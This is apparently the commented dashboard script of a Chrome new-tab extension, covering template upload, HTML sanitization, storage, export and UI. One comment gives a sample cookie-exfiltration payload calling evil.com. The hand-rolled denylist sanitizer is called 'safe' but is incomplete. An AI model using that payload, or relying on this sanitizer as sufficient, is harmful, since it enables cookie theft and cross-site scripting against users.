/**
 * dashboard.js — Upload, Sanitize, and Storage Logic
 *
 * ═══════════════════════════════════════════════════════════════
 * BIG PICTURE: WHAT DOES THIS FILE DO?
 * ═══════════════════════════════════════════════════════════════
 *
 * This is the brain of the TabCraft dashboard. It:
 *
 *   1. READS storage to show the current active template and library
 *   2. HANDLES file uploads (when a user selects an .html file)
 *   3. SANITIZES uploaded HTML (removes dangerous code)
 *   4. SAVES templates to Chrome storage
 *   5. ACTIVATES a template (sets it as the new tab content)
 *   6. DELETES user-uploaded templates
 *   7. EXPORTS the active template as a downloadable backup file
 *
 * ═══════════════════════════════════════════════════════════════
 * KEY CONCEPTS EXPLAINED
 * ═══════════════════════════════════════════════════════════════
 *
 * STORAGE KEYS:
 *   We store data in chrome.storage.local like a dictionary.
 *   Keys are like labels on filing folders:
 *     "activeTemplateId"   → which template is currently active
 *     "activeTemplateHtml" → the HTML content of the active template
 *     "userTemplates"      → array of user-uploaded templates
 *
 * ASYNC / CALLBACKS:
 *   Reading from storage is asynchronous — it takes a tiny amount
 *   of time. So instead of getting data back immediately, we pass
 *   a "callback function" that Chrome calls when the data is ready.
 *
 * THE DOM:
 *   "DOM" stands for Document Object Model — it's the live representation
 *   of everything on the page. document.getElementById('foo') finds the
 *   HTML element with id="foo" and lets us read or modify it.
 */


// ═════════════════════════════════════════════════════════════
// SECTION 1: CONSTANTS (labels that never change)
// ═════════════════════════════════════════════════════════════

const STORAGE_KEY_ACTIVE_ID   = "activeTemplateId";
const STORAGE_KEY_ACTIVE_HTML = "activeTemplateHtml";
const STORAGE_KEY_USER_TEMPLATES = "userTemplates";


// ═════════════════════════════════════════════════════════════
// SECTION 2: SANITIZATION — The Security Layer
// ═════════════════════════════════════════════════════════════

/**
 * sanitizeHtml(rawHtmlString)
 *
 * WHY DO WE NEED THIS?
 * A user could upload an HTML file containing malicious code like:
 *   <script>fetch('https://evil.com', {body: document.cookie})</script>
 *   <img onclick="doSomethingBad()">
 *
 * If we stored and rendered that without sanitizing, it could be dangerous.
 * Chrome Web Store reviewers also REQUIRE that extensions sanitize any
 * dynamic HTML before rendering it.
 *
 * HOW IT WORKS:
 *   1. We use the browser's built-in DOMParser to parse the HTML string
 *      into a real DOM tree (just like the browser parses a webpage).
 *   2. We then walk through that tree and remove dangerous elements/attributes.
 *   3. We return the cleaned HTML as a string.
 *
 * WHAT WE REMOVE:
 *   - <script> tags (JavaScript code)
 *   - <object> tags (can embed Flash or other content)
 *   - <embed> tags (can embed external content)
 *   - <iframe> tags (can embed other websites)
 *   - All on* attributes (onclick, onload, onmouseover, etc.)
 *   - All href="javascript:..." links
 *
 * @param {string} rawHtmlString - The raw HTML text from the uploaded file
 * @returns {string} - The sanitized HTML (safe to store and render)
 */
function sanitizeHtml(rawHtmlString) {

  // DOMParser is a browser built-in that converts an HTML string into a
  // real document object we can manipulate with JavaScript.
  const parser = new DOMParser();

  // "text/html" tells the parser to treat this as a full HTML document.
  // The result is a document object — just like `document` on a normal page.
  const parsedDoc = parser.parseFromString(rawHtmlString, "text/html");

  // ─── STEP 1: Remove dangerous TAGS ────────────────────────────────────
  // These are tag names we want to completely remove from the HTML.
  const DANGEROUS_TAGS = ["script", "object", "embed", "iframe", "base"];

  DANGEROUS_TAGS.forEach(function (tagName) {
    // querySelectorAll returns ALL elements matching the tag name
    // We use Array.from() to convert it to a regular array so we can loop it
    const elements = Array.from(parsedDoc.querySelectorAll(tagName));

    elements.forEach(function (element) {
      // .remove() deletes the element from the document entirely
      element.remove();
    });
  });

  // ─── STEP 2: Remove dangerous ATTRIBUTES from every element ───────────
  // Walk through every single element in the document
  const allElements = Array.from(parsedDoc.querySelectorAll("*"));

  allElements.forEach(function (element) {

    // element.attributes is a list of all attributes on this element,
    // e.g. class="foo", onclick="bar()", id="baz"
    // We clone it to a real array because we'll be removing items while looping
    const attributeNames = Array.from(element.attributes).map(function (attr) {
      return attr.name;
    });

    attributeNames.forEach(function (attrName) {

      // Remove all event handler attributes (they all start with "on")
      // Examples: onclick, onload, onmouseover, onkeydown, onerror, etc.
      if (attrName.startsWith("on")) {
        element.removeAttribute(attrName);
      }

      // Remove javascript: pseudo-protocol in href/src/action attributes.
      // e.g. <a href="javascript:evil()"> → dangerous!
      const dangerousAttrValue = element.getAttribute(attrName) || "";
      if (dangerousAttrValue.toLowerCase().trim().startsWith("javascript:")) {
        element.removeAttribute(attrName);
      }

    }); // End attribute loop

  }); // End element loop

  // ─── STEP 3: Extract the cleaned body content ─────────────────────────
  // parsedDoc.body.innerHTML is everything inside the <body> tag of the
  // parsed document, now cleaned of all dangerous code.
  // We return just the body content (not the full <html><head> wrapper)
  // because it will be injected inside our existing #app div.
  return parsedDoc.body.innerHTML;

} // End sanitizeHtml()


// ═════════════════════════════════════════════════════════════
// SECTION 3: STORAGE HELPERS — Read and Write
// ═════════════════════════════════════════════════════════════

/**
 * loadAllTemplates(callback)
 *
 * Reads both the default templates AND user-uploaded templates from storage.
 * Combines them into one array and passes that array to the callback function.
 *
 * WHY USE A CALLBACK HERE?
 * chrome.storage.local.get() is asynchronous. We can't just "return" the data.
 * Instead, we accept a callback and call it once the data is ready.
 *
 * @param {function} callback - Function to call with the combined array of templates
 */
function loadAllTemplates(callback) {

  chrome.storage.local.get([STORAGE_KEY_USER_TEMPLATES], function (result) {

    // result[STORAGE_KEY_USER_TEMPLATES] might be:
    //   - an array of objects (if the user has uploaded templates)
    //   - undefined (if nothing has been saved yet, i.e. first install)
    // The "|| []" means: "if it's undefined, use an empty array instead"
    const userTemplates = result[STORAGE_KEY_USER_TEMPLATES] || [];

    // Spread syntax (...) merges two arrays:
    // [...DEFAULT_TEMPLATES, ...userTemplates]
    // = [template1, template2, template3, userUpload1, userUpload2, ...]
    const allTemplates = [...DEFAULT_TEMPLATES, ...userTemplates];

    callback(allTemplates);

  });

}

/**
 * saveUserTemplates(templatesArray, callback)
 *
 * Saves the array of user-uploaded templates to Chrome storage.
 * Note: We never save DEFAULT_TEMPLATES to storage — they're always
 * available from defaults.js and saving them would waste storage space.
 *
 * @param {Array}    templatesArray - Array of user template objects to save
 * @param {function} callback       - Optional function to call after saving
 */
function saveUserTemplates(templatesArray, callback) {

  const dataToSave = {};
  dataToSave[STORAGE_KEY_USER_TEMPLATES] = templatesArray;

  // chrome.storage.local.set() accepts an object of key-value pairs.
  // The callback is called once the save is complete.
  chrome.storage.local.set(dataToSave, function () {
    if (callback) callback();
  });

}

/**
 * setActiveTemplate(template)
 *
 * Saves a template as the "active" one — the one shown on new tabs.
 * This saves both the template ID (to know which one is active)
 * and the full HTML string (so newtab.js can render it quickly).
 *
 * @param {Object} template - A template object with {id, name, html, ...}
 */
function setActiveTemplate(template) {

  const dataToSave = {};
  dataToSave[STORAGE_KEY_ACTIVE_ID]   = template.id;
  dataToSave[STORAGE_KEY_ACTIVE_HTML] = template.html;

  chrome.storage.local.set(dataToSave, function () {
    // After saving, refresh the dashboard UI to reflect the change
    renderDashboard();
  });

}


// ═════════════════════════════════════════════════════════════
// SECTION 4: UI RENDERING — Building the Dashboard
// ═════════════════════════════════════════════════════════════

/**
 * renderDashboard()
 *
 * The main function that draws the entire dashboard UI.
 * It reads current data from storage, then:
 *   1. Updates the "Active Template" card at the top
 *   2. Rebuilds the template grid cards
 *
 * This function is called:
 *   - On page load (to show initial state)
 *   - After activating a template (to show the new active one)
 *   - After uploading a new template (to show it in the grid)
 *   - After deleting a template (to remove it from the grid)
 */
function renderDashboard() {

  // First, find out which template is currently active
  chrome.storage.local.get([STORAGE_KEY_ACTIVE_ID], function (result) {

    const activeId = result[STORAGE_KEY_ACTIVE_ID];

    // Then load all templates (default + user-uploaded)
    loadAllTemplates(function (allTemplates) {

      // ─── UPDATE THE ACTIVE CARD ────────────────────────────────────
      const activeName = document.getElementById("activeName");

      if (activeId) {
        // Find the template object whose id matches the saved activeId
        const activeTemplate = allTemplates.find(function (t) {
          return t.id === activeId;
        });
        // If found, show its name; otherwise show a fallback message
        activeName.textContent = activeTemplate ? activeTemplate.name : "Unknown template";
      } else {
        activeName.textContent = "None — choose a template below";
      }

      // ─── BUILD THE TEMPLATE GRID ────────────────────────────────────
      const grid = document.getElementById("templateGrid");

      // Clear the grid before re-building it
      // (so we don't get duplicate cards)
      grid.innerHTML = "";

      // Loop through every template and create a card for each
      allTemplates.forEach(function (template) {

        const isActive = (template.id === activeId);

        // Create a new div element for this card
        const card = document.createElement("div");

        // Set the CSS class — add "active" class if this is the live template
        card.className = "template-card" + (isActive ? " is-active" : "");

        // data-id is a custom attribute — we use it to identify the card
        // when the user clicks Activate or Delete
        card.setAttribute("data-id", template.id);

        /*
          Build the card's inner HTML.
          We use template literals (backtick strings) to embed variables.
          ${variable} inside a backtick string gets replaced by the value.
        */
        card.innerHTML = `
          <div class="card-header">
            ${isActive ? '<span class="card-active-dot" title="Currently active"></span>' : ""}
            <span class="card-name">${escapeHtml(template.name)}</span>
            ${template.isDefault ? '<span class="card-tag">Built-in</span>' : '<span class="card-tag card-tag-user">Custom</span>'}
          </div>
          <div class="card-actions">
            ${
              isActive
                ? '<button class="btn btn-sm btn-disabled" disabled>✓ Active</button>'
                : `<button class="btn btn-sm btn-activate" data-id="${template.id}">Activate</button>`
            }
            ${
              // Only show Delete button for user-uploaded templates (not defaults)
              !template.isDefault
                ? `<button class="btn btn-sm btn-delete" data-id="${template.id}">Delete</button>`
                : ""
            }
          </div>
        `;

        // Add the finished card to the grid
        grid.appendChild(card);

      }); // End template loop

    }); // End loadAllTemplates callback

  }); // End storage.get callback

} // End renderDashboard()


// ═════════════════════════════════════════════════════════════
// SECTION 5: FILE UPLOAD HANDLER
// ═════════════════════════════════════════════════════════════

/**
 * handleFileUpload(event)
 *
 * Called when the user selects a file using the file input.
 * The `event` object contains info about what happened, including
 * the file the user chose.
 *
 * PIPELINE:
 *   File selected → Read as text → Sanitize → Save → Activate → Refresh UI
 *
 * @param {Event} event - The "change" event from the file input
 */
function handleFileUpload(event) {

  // event.target is the file input element
  // .files[0] is the first (and only) selected file
  const uploadedFile = event.target.files[0];

  // If no file was selected (user cancelled the dialog), do nothing
  if (!uploadedFile) return;

  // Double-check: make sure it's actually an HTML file
  // The file name should end with ".html"
  if (!uploadedFile.name.toLowerCase().endsWith(".html")) {
    showStatus("❌ Please upload a .html file only.", "error");
    return;
  }

  showStatus("⏳ Reading and sanitizing your file...", "info");

  /*
    FileReader is a browser API for reading file contents.
    It's asynchronous — reading takes a moment, so we give it a callback
    (onload) to call when it's done.
  */
  const reader = new FileReader();

  // This function runs when the file has been fully read
  reader.onload = function (readerEvent) {

    // readerEvent.target.result is the file's content as a text string
    const rawHtmlContent = readerEvent.target.result;

    // SANITIZE: Remove all dangerous code before saving
    const sanitizedContent = sanitizeHtml(rawHtmlContent);

    // Create a unique ID for this template using the current timestamp
    // Date.now() returns milliseconds since Jan 1, 1970 — always unique
    const newTemplateId = "user-" + Date.now();

    // Strip the ".html" extension from the filename for the display name
    // e.g. "my-cool-tab.html" → "my-cool-tab"
    const templateName = uploadedFile.name.replace(/\.html$/i, "");

    // Build the new template object
    const newTemplate = {
      id:        newTemplateId,
      name:      templateName,
      html:      sanitizedContent,
      isDefault: false,           // This is user-uploaded, not a built-in
      uploadedAt: new Date().toISOString() // ISO date string: "2025-01-01T12:00:00.000Z"
    };

    // Load existing user templates, add the new one, then save
    chrome.storage.local.get([STORAGE_KEY_USER_TEMPLATES], function (result) {

      const existingUserTemplates = result[STORAGE_KEY_USER_TEMPLATES] || [];

      // Create a new array with the existing templates PLUS the new one
      // We use spread syntax to avoid mutating the original array
      const updatedUserTemplates = [...existingUserTemplates, newTemplate];

      saveUserTemplates(updatedUserTemplates, function () {
        // After saving, automatically activate the newly uploaded template
        setActiveTemplate(newTemplate);
        showStatus(`✅ "${templateName}" uploaded and activated!`, "success");
      });

    });

    // Reset the file input so the user can upload the same file again if needed
    event.target.value = "";

  }; // End reader.onload

  // Start reading the file as text (UTF-8 encoding)
  reader.readAsText(uploadedFile);

} // End handleFileUpload()


// ═════════════════════════════════════════════════════════════
// SECTION 6: TEMPLATE ACTIONS — Activate & Delete
// ═════════════════════════════════════════════════════════════

/**
 * handleGridClick(event)
 *
 * This handles ALL clicks on the template grid using "event delegation."
 *
 * WHAT IS EVENT DELEGATION?
 * Instead of adding a click listener to every single button in the grid,
 * we add ONE listener to the whole grid. When any button inside is clicked,
 * the event "bubbles up" to the grid, and we can check what was clicked.
 *
 * WHY IS THIS BETTER?
 * When we refresh the grid (renderDashboard), all the old buttons are
 * replaced with new ones. If we'd attached listeners to the old buttons,
 * they'd be gone. With delegation, the grid listener always works because
 * the grid element itself never gets replaced.
 *
 * @param {Event} event - The click event
 */
function handleGridClick(event) {

  // event.target is the exact element that was clicked.
  // .closest() walks UP the DOM tree to find the nearest matching ancestor.
  // So even if the user clicks on text inside the button, we find the button.
  const activateBtn = event.target.closest(".btn-activate");
  const deleteBtn   = event.target.closest(".btn-delete");

  if (activateBtn) {
    // Get the template ID stored in the data-id attribute
    const templateId = activateBtn.getAttribute("data-id");
    activateTemplateById(templateId);
  }

  if (deleteBtn) {
    const templateId = deleteBtn.getAttribute("data-id");
    deleteTemplateById(templateId);
  }

}

/**
 * activateTemplateById(templateId)
 *
 * Finds a template by its ID, then saves it as the active template.
 *
 * @param {string} templateId - The ID of the template to activate
 */
function activateTemplateById(templateId) {

  loadAllTemplates(function (allTemplates) {

    const templateToActivate = allTemplates.find(function (t) {
      return t.id === templateId;
    });

    if (templateToActivate) {
      setActiveTemplate(templateToActivate);
      showStatus(`✅ "${templateToActivate.name}" is now your new tab!`, "success");
    }

  });

}

/**
 * deleteTemplateById(templateId)
 *
 * Removes a user-uploaded template from storage.
 * If the deleted template was the active one, clears the active template.
 *
 * @param {string} templateId - The ID of the template to delete
 */
function deleteTemplateById(templateId) {

  // First load the current user templates
  chrome.storage.local.get([STORAGE_KEY_USER_TEMPLATES, STORAGE_KEY_ACTIVE_ID], function (result) {

    const userTemplates = result[STORAGE_KEY_USER_TEMPLATES] || [];
    const activeId      = result[STORAGE_KEY_ACTIVE_ID];

    // Find the name before deleting (for the success message)
    const templateToDelete = userTemplates.find(function (t) { return t.id === templateId; });
    const deletedName = templateToDelete ? templateToDelete.name : "Template";

    // Filter OUT the template we want to delete.
    // .filter() returns a new array containing only items where the
    // function returns true. Since we return t.id !== templateId,
    // the template being deleted is excluded.
    const remainingTemplates = userTemplates.filter(function (t) {
      return t.id !== templateId;
    });

    // Save the filtered array back to storage
    saveUserTemplates(remainingTemplates, function () {

      // If we just deleted the active template, clear the active state
      if (activeId === templateId) {
        const dataToClear = {};
        dataToClear[STORAGE_KEY_ACTIVE_ID]   = null;
        dataToClear[STORAGE_KEY_ACTIVE_HTML] = null;
        chrome.storage.local.set(dataToClear, function () {
          renderDashboard();
          showStatus(`🗑️ "${deletedName}" deleted. Please activate another template.`, "info");
        });
      } else {
        renderDashboard();
        showStatus(`🗑️ "${deletedName}" deleted.`, "info");
      }

    });

  });

}


// ═════════════════════════════════════════════════════════════
// SECTION 7: EXPORT / BACKUP
// ═════════════════════════════════════════════════════════════

/**
 * handleExport()
 *
 * Downloads the currently active template's HTML as a .html file.
 *
 * HOW "DOWNLOADING" WORKS IN THE BROWSER (without a server):
 *   1. Create a "Blob" (Binary Large OBject) — basically a chunk of data
 *      stored in memory, like a virtual file.
 *   2. Create a URL pointing to that Blob using URL.createObjectURL().
 *   3. Create a hidden <a> link element pointing to that URL, with
 *      the "download" attribute set to the desired filename.
 *   4. Programmatically click that link — browser downloads the file.
 *   5. Clean up: remove the link and revoke the Blob URL.
 */
function handleExport() {

  chrome.storage.local.get([STORAGE_KEY_ACTIVE_ID, STORAGE_KEY_ACTIVE_HTML], function (result) {

    const activeId   = result[STORAGE_KEY_ACTIVE_ID];
    const activeHtml = result[STORAGE_KEY_ACTIVE_HTML];

    if (!activeHtml) {
      showStatus("⚠️ No active template to export.", "error");
      return;
    }

    // Find the template name for the filename
    loadAllTemplates(function (allTemplates) {

      const activeTemplate = allTemplates.find(function (t) { return t.id === activeId; });
      const fileName = activeTemplate
        ? activeTemplate.name.replace(/[^a-z0-9]/gi, "-").toLowerCase() + ".html"
        : "tabcraft-backup.html";

      // Create a Blob from the HTML string
      // "text/html" is the MIME type (tells the OS what kind of file this is)
      const blob = new Blob([activeHtml], { type: "text/html" });

      // Create a temporary URL pointing to the Blob
      const downloadUrl = URL.createObjectURL(blob);

      // Create a hidden link element
      const link = document.createElement("a");
      link.href = downloadUrl;
      link.download = fileName;  // "download" attribute = save as file, with this name

      // Add to page (needed in some browsers), click it, then remove it
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      // Free up memory by revoking the Blob URL
      URL.revokeObjectURL(downloadUrl);

      showStatus(`💾 Exported as "${fileName}"`, "success");

    });

  });

}


// ═════════════════════════════════════════════════════════════
// SECTION 8: UI UTILITIES
// ═════════════════════════════════════════════════════════════

/**
 * showStatus(message, type)
 *
 * Shows a status message in the status bar above the template grid.
 * Automatically hides after 4 seconds.
 *
 * @param {string} message - The text to display
 * @param {string} type    - "success", "error", or "info" (affects color)
 */
function showStatus(message, type) {
  const bar = document.getElementById("statusBar");
  bar.textContent  = message;
  bar.className    = "status-bar status-" + type; // e.g. "status-bar status-success"
  bar.style.display = "block";

  // Hide the message after 4 seconds
  // setTimeout(callback, milliseconds) runs a function once after a delay
  setTimeout(function () {
    bar.style.display = "none";
  }, 4000);
}

/**
 * escapeHtml(text)
 *
 * Converts special HTML characters to their safe equivalents.
 * This prevents user-provided text from being interpreted as HTML.
 *
 * WHY IS THIS NEEDED?
 * If a template is named: <script>evil()</script>
 * And we put that directly into innerHTML, it would execute!
 * By escaping it, it becomes: &lt;script&gt;evil()&lt;/script&gt;
 * Which displays as text, not as code.
 *
 * @param {string} text - Raw text that might contain HTML characters
 * @returns {string}    - Safe text with HTML characters escaped
 */
function escapeHtml(text) {
  // The ?. is "optional chaining" — if text is null/undefined, return "" safely
  return (text ?? "")
    .replace(/&/g,  "&amp;")   // & → &amp;   (must be first!)
    .replace(/</g,  "&lt;")    // < → &lt;
    .replace(/>/g,  "&gt;")    // > → &gt;
    .replace(/"/g,  "&quot;")  // " → &quot;
    .replace(/'/g,  "&#039;"); // ' → &#039;
}


// ═════════════════════════════════════════════════════════════
// SECTION 9: INITIALIZATION — Set Everything Up When Page Loads
// ═════════════════════════════════════════════════════════════

/**
 * initDashboard()
 *
 * This runs once when the dashboard page loads.
 * It:
 *   1. Checks if default templates have been initialized in storage
 *   2. Activates the first default template if no active template exists
 *   3. Renders the dashboard UI
 *   4. Attaches all event listeners to buttons and inputs
 *
 * WHY CHECK FOR FIRST-RUN?
 * On first install, storage is completely empty.
 * We want the user to immediately see a nice clock, not a blank new tab.
 * So we auto-activate the first default template on first run.
 */
function initDashboard() {

  chrome.storage.local.get([STORAGE_KEY_ACTIVE_ID], function (result) {

    const isFirstRun = !result[STORAGE_KEY_ACTIVE_ID];

    if (isFirstRun) {
      // No active template saved yet — activate the first default
      // DEFAULT_TEMPLATES[0] is the Minimalist Clock
      setActiveTemplate(DEFAULT_TEMPLATES[0]);
      // setActiveTemplate calls renderDashboard() when done
    } else {
      // Already have an active template — just render the dashboard
      renderDashboard();
    }

  });

  // ─── ATTACH EVENT LISTENERS ────────────────────────────────────────────
  // An event listener says: "when this thing happens, call this function."

  // FILE INPUT: When a file is selected, handle the upload
  document.getElementById("fileInput").addEventListener("change", handleFileUpload);

  // EXPORT BUTTON: When clicked, download the active template
  document.getElementById("exportBtn").addEventListener("click", handleExport);

  // TEMPLATE GRID: Handle all card button clicks via event delegation
  document.getElementById("templateGrid").addEventListener("click", handleGridClick);

}


// ─────────────────────────────────────────────────────────────────────────────
// START THE APP
// DOMContentLoaded fires when the browser has fully parsed the HTML file.
// This guarantees all elements (buttons, divs, inputs) exist before we
// try to find them with getElementById.
// ─────────────────────────────────────────────────────────────────────────────
document.addEventListener("DOMContentLoaded", initDashboard);
